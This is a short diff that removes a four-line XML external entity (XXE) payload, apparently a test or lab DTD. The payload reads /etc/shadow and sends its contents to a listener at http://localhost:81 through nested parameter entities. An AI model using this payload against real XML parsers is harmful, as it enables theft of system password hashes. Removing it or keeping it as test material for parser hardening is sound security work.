@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/shadow">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://localhost:81/?x=%file;'>">
-%eval;
-%exfiltrate;
